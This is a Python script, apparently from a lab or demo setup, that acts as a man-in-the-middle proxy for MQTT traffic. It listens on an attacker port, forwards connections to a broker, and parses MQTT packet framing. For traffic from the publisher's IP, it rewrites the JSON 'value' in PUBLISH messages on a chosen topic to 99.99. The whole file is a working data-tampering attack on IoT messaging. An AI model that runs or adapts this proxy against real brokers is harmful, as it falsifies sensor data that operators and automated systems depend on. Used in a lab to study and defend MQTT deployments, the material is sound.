import socket
import threading

from common.config import (
    ATTACKER_LISTEN_PORT,
    BROKER_IP,
    PORT,
    PUBLISHER_IP,
    TOPIC,
)

# MQTT packet types (high nibble of the fixed header first byte)
PUBLISH = 3

VALUE_PATTERN = None  # set below to avoid importing re twice
import re

VALUE_PATTERN = re.compile(rb'"value"\s*:\s*[\d.]+')
TAMPERED_VALUE = b'"value": 99.99'


def encode_remaining_length(n: int) -> bytes:
    out = bytearray()
    while True:
        digit = n % 128
        n //= 128
        if n > 0:
            digit |= 0x80
        out.append(digit)
        if n == 0:
            break
    return bytes(out)


def try_parse_packet(buf: bytes):
    """Return (packet_bytes, rest) if a complete MQTT packet is in buf, else (None, buf)."""
    if len(buf) < 2:
        return None, buf
    multiplier = 1
    remaining = 0
    i = 1
    while True:
        if i >= len(buf):
            return None, buf  # need more bytes for the length field
        byte = buf[i]
        remaining += (byte & 0x7F) * multiplier
        i += 1
        if not (byte & 0x80):
            break
        multiplier *= 128
        if multiplier > 128**3:
            raise ValueError("Malformed MQTT remaining length")
    total = i + remaining
    if len(buf) < total:
        return None, buf
    return buf[:total], buf[total:]


def tamper_publish(packet: bytes) -> bytes:
    """Rewrite the JSON value inside a PUBLISH packet, keeping MQTT framing valid."""
    first = packet[0]
    if (first >> 4) != PUBLISH:
        return packet

    # Re-parse the fixed header to know where the body starts
    multiplier = 1
    remaining = 0
    i = 1
    while True:
        byte = packet[i]
        remaining += (byte & 0x7F) * multiplier
        i += 1
        if not (byte & 0x80):
            break
        multiplier *= 128
    body_start = i
    body = packet[body_start:]

    # Variable header: topic length (2 bytes) + topic + optional packet-id (QoS>0)
    if len(body) < 2:
        return packet
    topic_len = int.from_bytes(body[0:2], "big")
    topic_end = 2 + topic_len
    if len(body) < topic_end:
        return packet
    topic = body[2:topic_end]
    if topic != TOPIC.encode():
        return packet

    qos = (first >> 1) & 0x03
    pid_len = 2 if qos > 0 else 0
    payload_start = topic_end + pid_len
    payload = body[payload_start:]

    new_payload = VALUE_PATTERN.sub(TAMPERED_VALUE, payload)
    if new_payload == payload:
        return packet

    new_body = body[:payload_start] + new_payload
    new_first = first
    new_header = bytes([new_first]) + encode_remaining_length(len(new_body))
    tampered = new_header + new_body
    print(f"[Proxy] tampered PUBLISH -> {new_payload}")
    return tampered


def relay(src, dst, tamper_for_ip=None, client_ip=None):
    buf = b""
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break
            buf += data
            while True:
                packet, buf = try_parse_packet(buf)
                if packet is None:
                    break
                if tamper_for_ip is not None and client_ip == tamper_for_ip:
                    packet = tamper_publish(packet)
                dst.sendall(packet)
    except (ConnectionResetError, BrokenPipeError):
        pass
    finally:
        try:
            dst.shutdown(socket.SHUT_WR)
        except OSError:
            pass


def handle(client_sock, client_ip):
    try:
        broker_sock = socket.create_connection((BROKER_IP, PORT))
    except OSError as e:
        print(f"[Proxy] cannot connect to broker: {e}")
        client_sock.close()
        return

    # Only tamper traffic from the publisher; leave the subscriber alone.
    t1 = threading.Thread(
        target=relay,
        args=(client_sock, broker_sock, PUBLISHER_IP, client_ip),
        daemon=True,
    )
    t2 = threading.Thread(
        target=relay,
        args=(broker_sock, client_sock, None, None),
        daemon=True,
    )
    t1.start()
    t2.start()
    t1.join()
    t2.join()

    client_sock.close()
    broker_sock.close()


def main():
    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", ATTACKER_LISTEN_PORT))
    server.listen(5)
    print(f"proxy listening on {ATTACKER_LISTEN_PORT}")
    try:
        while True:
            c, addr = server.accept()
            client_ip = addr[0]
            print(f"connection from {addr}")
            threading.Thread(target=handle, args=(c, client_ip), daemon=True).start()
    except KeyboardInterrupt:
        print("proxy shutting down")
    finally:
        server.close()


if __name__ == "__main__":
    main()
